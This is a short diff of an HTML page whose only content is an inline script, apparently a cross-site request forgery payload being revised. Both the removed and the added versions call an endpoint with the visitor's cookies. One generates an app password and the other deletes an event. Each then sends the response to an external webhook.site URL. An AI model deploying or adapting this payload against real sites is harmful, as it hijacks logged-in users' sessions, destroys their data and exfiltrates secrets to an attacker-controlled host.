@@ -2,13 +2,13 @@
 <html>
 <body>
 <script>
-fetch('/generate_app_password', {
-  method: 'POST',
+fetch('/delete_event/11', {
+  method: 'GET',
   credentials: 'include'
 })
-.then(res => res.text())
+.then(r => r.text())
 .then(data => {
-  fetch('https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?leak=' + encodeURIComponent(data));
+  fetch('https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?log=' + btoa(data));
 });
 </script>
 </body>
